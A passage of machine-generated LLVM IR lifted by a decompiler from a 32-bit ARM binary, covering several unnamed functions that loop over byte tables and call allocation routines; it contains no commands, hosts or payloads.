  %v1_83a4 = load i32, i32* @ip, align 4
  %v2_83a4 = add i32 %v1_83a4, 4
  %v3_83a4 = inttoptr i32 %v2_83a4 to i32*
  store i32 %v0_83a4, i32* %v3_83a4, align 4
  %v0_83a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_83a8 = trunc i32 %v0_83a8 to i16
  %v2_83a8 = load i32, i32* @ip, align 4
  %v3_83a8 = inttoptr i32 %v2_83a8 to i16*
  store i16 %v1_83a8, i16* %v3_83a8, align 2
  %v0_83ac = load i32, i32* %r0.global-to-local, align 4
  %v1_83ac = add i32 %v0_83ac, 5
  store i32 %v1_83ac, i32* %r0.global-to-local, align 4
  %v0_83b0 = load i32, i32* @ip, align 4
  %v1_83b0 = add i32 %v0_83b0, 24
  store i32 %v1_83b0, i32* @ip, align 4
  %v0_83b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83b4, label %dec_label_pc_83b8, label %dec_label_pc_8380

dec_label_pc_83b8:                                ; preds = %dec_label_pc_8380
  %v0_83b8 = load i32, i32* @r6, align 4
  %v2_83b8 = icmp eq i32 %v0_83b8, 0
  store i1 %v2_83b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83b8, label %dec_label_pc_84bc, label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_83b8
  %v0_83c0 = load i32, i32* @r4, align 4
  %v1_83c0 = inttoptr i32 %v0_83c0 to i8*
  %v2_83c0 = load i8, i8* %v1_83c0, align 1
  %v3_83c0 = zext i8 %v2_83c0 to i32
  store i32 %v3_83c0, i32* @r5, align 4
  %v2_83c4 = icmp eq i8 %v2_83c0, 0
  store i1 %v2_83c4, i1* %cpsr_z.global-to-local, align 1
  %v0_83c8 = load i32, i32* @r7, align 4
  %v1_83c8 = add i32 %v0_83c8, -7
  store i32 %v1_83c8, i32* @r8, align 4
  br i1 %v2_83c4, label %bb, label %dec_label_pc_83d4

bb:                                               ; preds = %dec_label_pc_83c0
  store i32 %v3_83c0, i32* @r6, align 4
  br label %dec_label_pc_8498

dec_label_pc_83d4:                                ; preds = %dec_label_pc_83c0
  store i32 %v3_83c0, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_83dc = call i32 @function_11f24(i32 %v3_83c0, i32 8)
  store i32 %v2_83dc, i32* %r0.global-to-local, align 4
  %v0_83e0 = load i32, i32* @r8, align 4
  %v2_83e0 = icmp eq i32 %v0_83e0, 0
  store i1 %v2_83e0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_83dc, i32* @r6, align 4
  br i1 %v2_83e0, label %dec_label_pc_84bc, label %dec_label_pc_83ec

dec_label_pc_83ec:                                ; preds = %dec_label_pc_83d4
  %v0_83ec = load i32, i32* @r4, align 4
  %v1_83ec = add i32 %v0_83ec, 1
  %v2_83ec = inttoptr i32 %v1_83ec to i8*
  %v3_83ec = load i8, i8* %v2_83ec, align 1
  %v0_83f0 = load i32, i32* @r7, align 4
  %v7_83f0 = icmp eq i32 %v0_83f0, 8
  store i1 %v7_83f0, i1* %cpsr_z.global-to-local, align 1
  %v3_83f4 = add i32 %v2_83dc, 4
  %v4_83f4 = inttoptr i32 %v3_83f4 to i8*
  store i8 %v3_83ec, i8* %v4_83f4, align 1
  %v0_83f8 = load i32, i32* @r4, align 4
  %v1_83f8 = add i32 %v0_83f8, 1
  store i32 %v1_83f8, i32* %r3.global-to-local, align 4
  %v0_83fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83fc, label %dec_label_pc_84bc, label %dec_label_pc_8400

dec_label_pc_8400:                                ; preds = %dec_label_pc_83ec
  %v1_8400 = add i32 %v0_83f8, 2
  %v2_8400 = inttoptr i32 %v1_8400 to i8*
  %v3_8400 = load i8, i8* %v2_8400, align 1
  %v4_8400 = zext i8 %v3_8400 to i32
  store i32 %v4_8400, i32* @r4, align 4
  %v0_8404 = load i32, i32* @r7, align 4
  %v1_8404 = add i32 %v0_8404, -9
  store i32 %v1_8404, i32* @r8, align 4
  %v9_8408 = icmp eq i32 %v1_8404, %v4_8400
  store i1 %v9_8408, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8400, i32* %r1.global-to-local, align 4
  %v5_8410 = icmp slt i32 %v1_8404, %v4_8400
  br i1 %v5_8410, label %dec_label_pc_84bc, label %bb35

bb35:                                             ; preds = %dec_label_pc_8400
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_84147 = add i32 %v0_83f8, 3
  store i32 %v7_84147, i32* @r7, align 4
  %v6_8418 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8418, i32* @sl, align 4
  br label %dec_label_pc_845c

dec_label_pc_8428:                                ; preds = %dec_label_pc_845c
  %v0_8428 = load i32, i32* @r8, align 4
  %v1_8428 = load i32, i32* @r4, align 4
  %v2_8428 = sub i32 %v0_8428, %v1_8428
  store i32 %v2_8428, i32* %r2.global-to-local, align 4
  %v9_8428 = icmp eq i32 %v0_8428, %v1_8428
  store i1 %v9_8428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8428, label %dec_label_pc_84bc, label %dec_label_pc_8430

dec_label_pc_8430:                                ; preds = %dec_label_pc_8428
  %v1_8430 = load i32, i32* @r7, align 4
  %v2_8430 = add i32 %v1_8430, %v1_8428
  %v3_8430 = inttoptr i32 %v2_8430 to i8*
  %v4_8430 = load i8, i8* %v3_8430, align 1
  store i32 %v2_8430, i32* %r0.global-to-local, align 4
  %v1_8438 = add i32 %v2_8428, -1
  store i32 %v1_8438, i32* %r2.global-to-local, align 4
  %v7_8438 = icmp eq i32 %v2_8428, 1
  store i1 %v7_8438, i1* %cpsr_z.global-to-local, align 1
  %v3_843c = add i32 %v2_8490, 4
  %v4_843c = inttoptr i32 %v3_843c to i8*
  store i8 %v4_8430, i8* %v4_843c, align 1
  %v0_8440 = load i32, i32* %r0.global-to-local, align 4
  %v1_8440 = add i32 %v0_8440, 1
  store i32 %v1_8440, i32* %r3.global-to-local, align 4
  %v0_8444 = load i32, i32* %r2.global-to-local, align 4
  %v1_8444 = add i32 %v0_8444, -1
  store i32 %v1_8444, i32* @r8, align 4
  %v1_8448 = add i32 %v0_8440, 2
  store i32 %v1_8448, i32* @r7, align 4
  %v0_844c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_844c, label %dec_label_pc_84bc, label %dec_label_pc_8450

dec_label_pc_8450:                                ; preds = %dec_label_pc_8430
  %v2_8450 = inttoptr i32 %v1_8440 to i8*
  %v3_8450 = load i8, i8* %v2_8450, align 1
  %v4_8450 = zext i8 %v3_8450 to i32
  store i32 %v4_8450, i32* @r4, align 4
  %v2_8454 = sub i32 %v1_8444, %v4_8450
  %tmp36 = sub i32 0, %v2_8454
  %v6_8454 = and i32 %v1_8444, %tmp36
  %v7_8454 = icmp slt i32 %v6_8454, 0
  %v8_8454 = icmp slt i32 %v2_8454, 0
  %v9_8454 = icmp eq i32 %v1_8444, %v4_8450
  store i1 %v9_8454, i1* %cpsr_z.global-to-local, align 1
  %v2_8458 = xor i1 %v8_8454, %v7_8454
  br i1 %v2_8458, label %dec_label_pc_84bc, label %dec_label_pc_845c

dec_label_pc_845c:                                ; preds = %bb35, %dec_label_pc_8450
  %v0_8460 = phi i32 [ %v4_8400, %bb35 ], [ %v4_8450, %dec_label_pc_8450 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_8470, %dec_label_pc_8450 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_8460 = add nuw nsw i32 %v0_8460, 1
  store i32 %v1_8460, i32* %r0.global-to-local, align 4
  %v2_8464 = call i32 @function_11f24(i32 %v1_8460, i32 1)
  store i32 %v2_8464, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_846c = load i32, i32* @sl, align 4
  %v2_846c = inttoptr i32 %v1_846c to i32*
  store i32 %v2_8464, i32* %v2_846c, align 4
  %v0_8470 = load i32, i32* %r3.global-to-local, align 4
  %v1_8470 = add i32 %v0_8470, 1
  store i32 %v1_8470, i32* %r3.global-to-local, align 4
  %v0_8474 = load i32, i32* @r4, align 4
  store i32 %v0_8474, i32* %r2.global-to-local, align 4
  %v0_8478 = load i32, i32* @r7, align 4
  store i32 %v0_8478, i32* %r1.global-to-local, align 4
  %v3_8480 = call i32 @function_10190(i32 %v2_8464, i32 %v0_8478, i32 %v0_8474)
  store i32 %v3_8480, i32* %r0.global-to-local, align 4
  store i32 %v1_8470, i32* %r2.global-to-local, align 4
  %v3_8488 = mul i32 %v1_8470, 8
  store i32 %v3_8488, i32* %r3.global-to-local, align 4
  %v1_848c = load i32, i32* @r5, align 4
  %v9_848c = icmp eq i32 %v1_8470, %v1_848c
  store i1 %v9_848c, i1* %cpsr_z.global-to-local, align 1
  %v0_8490 = load i32, i32* @r6, align 4
  %v2_8490 = add i32 %v0_8490, %v3_8488
  store i32 %v2_8490, i32* @sl, align 4
  br i1 %v9_848c, label %dec_label_pc_8498, label %dec_label_pc_8428

dec_label_pc_8498:                                ; preds = %dec_label_pc_845c, %bb
  %v0_8498 = call i32 @function_11008()
  %v2_84a0 = inttoptr i32 %v0_8498 to i32*
  store i32 0, i32* %v2_84a0, align 4
  store i32 %v4_8330, i32* %r1.global-to-local, align 4
  %v0_84a8 = load i32, i32* @fp, align 4
  store i32 %v0_84a8, i32* %r0.global-to-local, align 4
  %v0_84ac = load i32, i32* @sb, align 4
  store i32 %v0_84ac, i32* %r2.global-to-local, align 4
  store i32 %v2_836c, i32* %r3.global-to-local, align 4
  %v2_84b4 = load i32, i32* @r5, align 4
  %v5_84b4 = load i32, i32* @r6, align 4
  %v6_84b8 = trunc i32 %v2_84b4 to i8
  %v7_84b8 = call i32 @function_81ec(i32 %v0_84a8, i32 %v4_8330, i32 %v0_84ac, i32 %v2_836c, i8 %v6_84b8, i32 %v5_84b4)
  store i32 %v7_84b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_84bc

dec_label_pc_84bc:                                ; preds = %dec_label_pc_8450, %dec_label_pc_8430, %dec_label_pc_8428, %dec_label_pc_8400, %dec_label_pc_83ec, %dec_label_pc_83d4, %dec_label_pc_83b8, %dec_label_pc_8498
  store i32 %v2_836c, i32* %r3.global-to-local, align 4
  %v2_84c0 = icmp eq i32 %v2_836c, 0
  store i1 %v2_84c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84c0, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_84bc
  store i32 %v2_836c, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_84bc, %bb37
  store i32 33996, i32* @lr, align 4
  %v1_84c8 = xor i1 %v2_84c0, true
  call void @__pseudo_cond_branch(i1 %v1_84c8, i32 ptrtoint (i32* @global_var_12670.21 to i32))
  %v0_84cc = load i32, i32* @r6, align 4
  %v2_84cc = icmp eq i32 %v0_84cc, 0
  store i1 %v2_84cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84cc, label %.dec_label_pc_8300_crit_edge, label %dec_label_pc_84d4

.dec_label_pc_8300_crit_edge:                     ; preds = %bb38
  %v1_8308.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8300

dec_label_pc_84d4:                                ; preds = %bb38
  %v0_84d4 = load i32, i32* @r5, align 4
  %v2_84d4 = icmp eq i32 %v0_84d4, 0
  store i1 %v2_84d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84d4, label %dec_label_pc_84f8, label %dec_label_pc_84dc

dec_label_pc_84dc:                                ; preds = %dec_label_pc_84d4
  br label %dec_label_pc_84e0

dec_label_pc_84e0:                                ; preds = %dec_label_pc_84e0, %dec_label_pc_84dc
  %v0_84e8 = phi i32 [ 0, %dec_label_pc_84dc ], [ %v1_84f0, %dec_label_pc_84e0 ]
  %v0_84e0 = phi i32 [ %v0_84cc, %dec_label_pc_84dc ], [ %v0_84f8.pre, %dec_label_pc_84e0 ]
  %v4_84e0 = mul i32 %v0_84e8, 8
  %v5_84e0 = add i32 %v4_84e0, %v0_84e0
  %v6_84e0 = inttoptr i32 %v5_84e0 to i32*
  %v7_84e0 = load i32, i32* %v6_84e0, align 4
  store i32 %v7_84e0, i32* %r0.global-to-local, align 4
  %v2_84e4 = icmp eq i32 %v7_84e0, 0
  store i1 %v2_84e4, i1* %cpsr_z.global-to-local, align 1
  %v1_84e8 = add i32 %v0_84e8, 1
  store i32 %v1_84e8, i32* @r4, align 4
  store i32 34032, i32* @lr, align 4
  %v1_84ec = xor i1 %v2_84e4, true
  call void @__pseudo_cond_branch(i1 %v1_84ec, i32 ptrtoint (i32* @global_var_12670.21 to i32))
  %v0_84f0 = load i32, i32* @r5, align 4
  %v1_84f0 = load i32, i32* @r4, align 4
  %v9_84f0 = icmp eq i32 %v0_84f0, %v1_84f0
  store i1 %v9_84f0, i1* %cpsr_z.global-to-local, align 1
  %v0_84f8.pre = load i32, i32* @r6, align 4
  br i1 %v9_84f0, label %dec_label_pc_84f8, label %dec_label_pc_84e0

dec_label_pc_84f8:                                ; preds = %dec_label_pc_84e0, %dec_label_pc_84d4
  %v0_84f8 = phi i32 [ %v0_84cc, %dec_label_pc_84d4 ], [ %v0_84f8.pre, %dec_label_pc_84e0 ]
  store i32 %v0_84f8, i32* @r0, align 4
  %v0_84fc = call i32 @function_12670()
  store i32 %v0_84fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8300

; uselistorder directives
  uselistorder i32 %v0_84fc, { 1, 0 }
  uselistorder i32 %v1_84f0, { 1, 0 }
  uselistorder i1 %v2_84c0, { 0, 2, 1 }
  uselistorder i32 %v2_8490, { 1, 0 }
  uselistorder i32 %v3_8488, { 1, 0 }
  uselistorder i32 %v1_8470, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_8454, { 1, 0 }
  uselistorder i32 %v4_8450, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8444, { 2, 0, 1, 3 }
  uselistorder i32 %v3_83c0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83b0, { 1, 0 }
  uselistorder i32 %v1_83ac, { 1, 0 }
  uselistorder i32 %v2_836c, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_8340, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8310, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_830c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_82f8, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 17, 4, 2, 6, 9, 11, 10, 7, 8, 18, 19, 12, 13, 14, 15, 16, 20, 21, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_84bc, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_845c, { 1, 0 }
  uselistorder label %dec_label_pc_8300, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @function_8504(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8504:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_8504 = icmp eq i32 %arg1, 0
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8504, label %dec_label_pc_854c, label %dec_label_pc_8514

dec_label_pc_8514:                                ; preds = %dec_label_pc_8504
  %v0_8514 = load i32, i32* %r1.global-to-local, align 4
  %v1_8514 = add i32 %v0_8514, 4
  %v2_8514 = inttoptr i32 %v1_8514 to i8*
  %v3_8514 = load i8, i8* %v2_8514, align 1
  %v4_8514 = zext i8 %v3_8514 to i32
  %v9_8518 = icmp eq i32 %v4_8514, %arg3
  br i1 %v9_8518, label %dec_label_pc_8558, label %dec_label_pc_853c.preheader

dec_label_pc_853c.preheader:                      ; preds = %dec_label_pc_8514
  br label %dec_label_pc_853c

dec_label_pc_852c:                                ; preds = %dec_label_pc_853c
  %v1_852c = add i32 %v0_8534.in, 12
  %v2_852c = inttoptr i32 %v1_852c to i8*
  %v3_852c = load i8, i8* %v2_852c, align 1
  %v4_852c = zext i8 %v3_852c to i32
  %v9_8530 = icmp eq i32 %v4_852c, %arg3
  br i1 %v9_8530, label %dec_label_pc_8558, label %dec_label_pc_853c

dec_label_pc_853c:                                ; preds = %dec_label_pc_853c.preheader, %dec_label_pc_852c
  %v0_8534.in = phi i32 [ %v0_8514, %dec_label_pc_853c.preheader ], [ %v0_8534, %dec_label_pc_852c ]
  %v0_853c = phi i32 [ 0, %dec_label_pc_853c.preheader ], [ %v1_853c, %dec_label_pc_852c ]
  %v0_8534 = add i32 %v0_8534.in, 8
  %v1_853c = add i32 %v0_853c, 1
  %v9_8540 = icmp eq i32 %v1_853c, %arg1
  store i32 %v0_8534, i32* %r1.global-to-local, align 4
  br i1 %v9_8540, label %dec_label_pc_854c, label %dec_label_pc_852c

dec_label_pc_854c:                                ; preds = %dec_label_pc_853c, %dec_label_pc_8558, %dec_label_pc_8504, %dec_label_pc_8564
  %v0_854c = phi i32 [ %arg4, %dec_label_pc_8558 ], [ %arg4, %dec_label_pc_8504 ], [ %v1_8564, %dec_label_pc_8564 ], [ %arg4, %dec_label_pc_853c ]
  ret i32 %v0_854c

dec_label_pc_8558:                                ; preds = %dec_label_pc_852c, %dec_label_pc_8514
  %v0_8558 = phi i32 [ %v0_8514, %dec_label_pc_8514 ], [ %v0_8534, %dec_label_pc_852c ]
  %v1_8558 = inttoptr i32 %v0_8558 to i32*
  %v2_8558 = load i32, i32* %v1_8558, align 4
  store i32 %v2_8558, i32* @r0, align 4
  %v2_855c = icmp eq i32 %v2_8558, 0
  br i1 %v2_855c, label %dec_label_pc_854c, label %dec_label_pc_8564

dec_label_pc_8564:                                ; preds = %dec_label_pc_8558
  %v1_8564 = call i32 @function_11144(i32 %v2_8558)
  br label %dec_label_pc_854c

; uselistorder directives
  uselistorder i32 %v1_853c, { 1, 0 }
  uselistorder i32 %v0_8534, { 1, 0, 2 }
  uselistorder i32 %v0_8534.in, { 1, 0 }
  uselistorder i32 %v0_8514, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_854c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_853c, { 1, 0 }
}

define i32 @function_8570(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8570:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8570 = icmp eq i32 %arg1, 0
  %v3_8574 = load i32, i32* @r4, align 4
  store i32 %v3_8574, i32* %stack_var_-8, align 4
  %v6_8574 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8570, label %dec_label_pc_85b8, label %dec_label_pc_8580

dec_label_pc_8580:                                ; preds = %dec_label_pc_8570
  %v0_8580 = load i32, i32* %r1.global-to-local, align 4
  %v1_8580 = add i32 %v0_8580, 4
  %v2_8580 = inttoptr i32 %v1_8580 to i8*
  %v3_8580 = load i8, i8* %v2_8580, align 1
  %v4_8580 = zext i8 %v3_8580 to i32
  %v9_8584 = icmp eq i32 %v4_8580, %arg3
  br i1 %v9_8584, label %dec_label_pc_85c4, label %dec_label_pc_85a8.preheader

dec_label_pc_85a8.preheader:                      ; preds = %dec_label_pc_8580
  br label %dec_label_pc_85a8

dec_label_pc_8598:                                ; preds = %dec_label_pc_85a8
  %v1_8598 = add i32 %v0_85a0.in, 12
  %v2_8598 = inttoptr i32 %v1_8598 to i8*
  %v3_8598 = load i8, i8* %v2_8598, align 1
  %v4_8598 = zext i8 %v3_8598 to i32
  %v9_859c = icmp eq i32 %v4_8598, %arg3
  br i1 %v9_859c, label %dec_label_pc_85c4, label %dec_label_pc_85a8

dec_label_pc_85a8:                                ; preds = %dec_label_pc_85a8.preheader, %dec_label_pc_8598
  %v0_85a0.in = phi i32 [ %v0_8580, %dec_label_pc_85a8.preheader ], [ %v0_85a0, %dec_label_pc_8598 ]
  %v0_85a8 = phi i32 [ 0, %dec_label_pc_85a8.preheader ], [ %v1_85a8, %dec_label_pc_8598 ]
  %v0_85a0 = add i32 %v0_85a0.in, 8
  %v1_85a8 = add i32 %v0_85a8, 1
  store i32 %v1_85a8, i32* @lr, align 4
  %v9_85ac = icmp eq i32 %v1_85a8, %arg1
  store i32 %v0_85a0, i32* %r1.global-to-local, align 4
  br i1 %v9_85ac, label %dec_label_pc_85b8, label %dec_label_pc_8598

dec_label_pc_85b8:                                ; preds = %dec_label_pc_85a8, %dec_label_pc_85c4, %dec_label_pc_8570, %dec_label_pc_85d0
  %v2_85bc = phi i32 [ %v3_8574, %dec_label_pc_85c4 ], [ %v3_8574, %dec_label_pc_8570 ], [ %v2_85bc.pre, %dec_label_pc_85d0 ], [ %v3_8574, %dec_label_pc_85a8 ]
  %v0_85b8 = phi i32 [ %arg4, %dec_label_pc_85c4 ], [ %arg4, %dec_label_pc_8570 ], [ %v3_85d4, %dec_label_pc_85d0 ], [ %arg4, %dec_label_pc_85a8 ]
  store i32 %v2_85bc, i32* @r4, align 4
  store i32 %v6_8574, i32* @lr, align 4
  ret i32 %v0_85b8

dec_label_pc_85c4:                                ; preds = %dec_label_pc_8598, %dec_label_pc_8580
  %v0_85c4 = phi i32 [ %v0_8580, %dec_label_pc_8580 ], [ %v0_85a0, %dec_label_pc_8598 ]
  %v1_85c4 = inttoptr i32 %v0_85c4 to i32*
  %v2_85c4 = load i32, i32* %v1_85c4, align 4
  %v2_85c8 = icmp eq i32 %v2_85c4, 0
  br i1 %v2_85c8, label %dec_label_pc_85b8, label %dec_label_pc_85d0

dec_label_pc_85d0:                                ; preds = %dec_label_pc_85c4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_85d4 = inttoptr i32 %v2_85c4 to i8*
  %v3_85d4 = call i32 @function_10244(i8* %v2_85d4, i32 10)
  %v2_85bc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_85b8

; uselistorder directives
  uselistorder i32 %v1_85a8, { 1, 2, 0 }
  uselistorder i32 %v0_85a0, { 1, 0, 2 }
  uselistorder i32 %v0_85a0.in, { 1, 0 }
  uselistorder i32 %v0_8580, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_85b8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_85a8, { 1, 0 }
}

define i32 @function_85e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_85e0:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_85e0 = load i32, i32* @r4, align 4
  store i32 %v3_85e0, i32* %stack_var_-24, align 4
  %v6_85e0 = load i32, i32* @r5, align 4
  %v9_85e0 = load i32, i32* @r6, align 4
  %v12_85e0 = load i32, i32* @r7, align 4
  %v15_85e0 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_85ec = call i32 @function_11f24(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_1e6f4.17 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1e6f8.19 to i32), i32* @r6, align 4
  store i32 36524, i32* %r2.global-to-local, align 4
  store i32 %v2_85ec, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1e6f5.25 to i32), i32* %r1.global-to-local, align 4
  %v2_860c = load i32, i32* @global_var_1e6f8.19, align 4
  %v2_8610 = inttoptr i32 %v2_85ec to i32*
  store i32 36524, i32* %v2_8610, align 4
  %v3_8614 = load i32, i32* @r5, align 4
  %v4_8614 = add i32 %v3_8614, 4
  %v5_8614 = inttoptr i32 %v4_8614 to i8*
  store i8 0, i8* %v5_8614, align 1
  %v0_8618 = load i32, i32* %r1.global-to-local, align 4
  %v3_8618 = mul i32 %v0_8618, 4
  store i32 %v3_8618, i32* %r1.global-to-local, align 4
  %v5_861c = inttoptr i32 %v2_860c to i32*
  %v6_861c = call i32 @function_12058(i32* %v5_861c, i32 %v3_8618, i32 36524, i32 0)
  %v2_8620 = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_8620 = zext i8 %v2_8620 to i32
  store i32 %v6_861c, i32* %r2.global-to-local, align 4
  %v0_8628 = load i32, i32* @r5, align 4
  %v5_8628 = mul nuw nsw i32 %v3_8620, 4
  %v6_8628 = add i32 %v5_8628, %v6_861c
  %v7_8628 = inttoptr i32 %v6_8628 to i32*
  store i32 %v0_8628, i32* %v7_8628, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1e6f5.25 to i32), i32* %r3.global-to-local, align 4
  %v1_8638 = load i32, i32* @r6, align 4
  %v2_8638 = inttoptr i32 %v1_8638 to i32*
  store i32 %v6_861c, i32* %v2_8638, align 4
  %v0_863c = load i32, i32* %r3.global-to-local, align 4
  %v1_863c = trunc i32 %v0_863c to i8
  %v2_863c = load i32, i32* @r4, align 4
  %v3_863c = inttoptr i32 %v2_863c to i8*
  store i8 %v1_863c, i8* %v3_863c, align 1
  %v2_8640 = call i32 @function_11f24(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_a048.27 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_8640, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_1e6f5.25 to i32), i32* %r1.global-to-local, align 4
  %v2_8658 = load i32, i32* @global_var_1e6f8.19, align 4
  %v2_865c = inttoptr i32 %v2_8640 to i32*
  store i32 ptrtoint (i32* @global_var_a048.27 to i32), i32* %v2_865c, align 4
  %v0_8660 = load i32, i32* @r8, align 4
  %v1_8660 = trunc i32 %v0_8660 to i8
  %v2_8660 = load i32, i32* @r5, align 4
  %v3_8660 = add i32 %v2_8660, 4
  %v4_8660 = inttoptr i32 %v3_8660 to i8*
  store i8 %v1_8660, i8* %v4_8660, align 1
  %v0_8664 = load i32, i32* %r1.global-to-local, align 4
  %v3_8664 = mul i32 %v0_8664, 4
  store i32 %v3_8664, i32* %r1.global-to-local, align 4
  %v4_8668 = inttoptr i32 %v2_8658 to i32*
  %v5_8668 = call i32 @function_12058(i32* %v4_8668, i32 %v3_8664, i32 %v6_861c, i32 ptrtoint (i32* @global_var_a048.27 to i32))
  %v2_866c = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_866c = zext i8 %v2_866c to i32
  store i32 %v3_866c, i32* %r3.global-to-local, align 4
  store i32 %v5_8668, i32* %r2.global-to-local, align 4
  %v0_8674 = load i32, i32* @r5, align 4
  %v5_8674 = mul nuw nsw i32 %v3_866c, 4
  %v6_8674 = add i32 %v5_8674, %v5_8668
  %v7_8674 = inttoptr i32 %v6_8674 to i32*
  store i32 %v0_8674, i32* %v7_8674, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_867c = load i32, i32* %r3.global-to-local, align 4
  %v1_867c = load i32, i32* @r8, align 4
  %v2_867c = add i32 %v1_867c, %v0_867c
  store i32 %v2_867c, i32* %r3.global-to-local, align 4
  %v1_8684 = trunc i32 %v2_867c to i8
  %v2_8684 = load i32, i32* @r4, align 4
  %v3_8684 = inttoptr i32 %v2_8684 to i8*
  store i8 %v1_8684, i8* %v3_8684, align 1
  %v0_8688 = load i32, i32* %r2.global-to-local, align 4
  %v1_8688 = load i32, i32* @r6, align 4
  %v2_8688 = inttoptr i32 %v1_8688 to i32*
  store i32 %v0_8688, i32* %v2_8688, align 4
  %v2_868c = call i32 @function_11f24(i32 %v1_867c, i32 8)
  %v2_8690 = load i8, i8* bitcast (i8** @global_var_1e6f4.17 to i8*), align 4
  %v3_8690 = zext i8 %v2_8690 to i32
  store i32 ptrtoint (i32* @global_var_a480.29 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_868c, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_86a0 = load i32, i32* @r8, align 4
  %v2_86a0 = add i32 %v1_86a0, %v3_8690
  store i32 %v2_86a0, i32* %r1.global-to-local, align 4
  %v2_86a4 = load i32, i32* @global_var_1e6f8.19, align 4
  %v2_86a8 = inttoptr i32 %v2_868c to i32*
  store i32 ptrtoint (i32* @global_var_a480.29 to i32), i32* %v2_86a8, align 4
  %v3_86ac = load i32, i32* @r5, align 4
  %v4_86ac = add i32 %v3_86ac, 4
  %v5_86ac = inttoptr i32 %v4_86ac to i8*
  store i8 2, i8* %v5_86ac, align 1
  %v0_86b0 = load i32, i32* %r1.global-to-local, align 4
  %v3_86b0 = mul i32 %v0_86b0, 4
  store i32 %v3_86b0, i32* %r1.global-to-local, align 4
  %v5_86b4 = inttoptr i32 %v2_86a4 to i32*
